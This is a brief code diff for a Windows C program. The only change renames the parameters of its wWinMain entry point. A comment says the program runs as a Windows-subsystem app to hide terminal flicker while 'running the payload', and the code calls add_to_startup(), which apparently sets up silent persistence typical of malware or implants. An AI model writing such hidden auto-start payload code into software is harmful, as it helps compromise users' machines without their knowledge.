@@ -6,7 +6,7 @@
  * The entry point for the application is a Windows subsystem to prevent a brief 
  * terminal flicker when running the payload.
  */
-int APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev_instance,
+int APIENTRY wWinMain(_In_ HINSTANCE inst, _In_opt_ HINSTANCE prev_inst,
 		      _In_ LPWSTR cmd_line, _In_ int cmd_show) 
 {
 	LONG rc = add_to_startup();
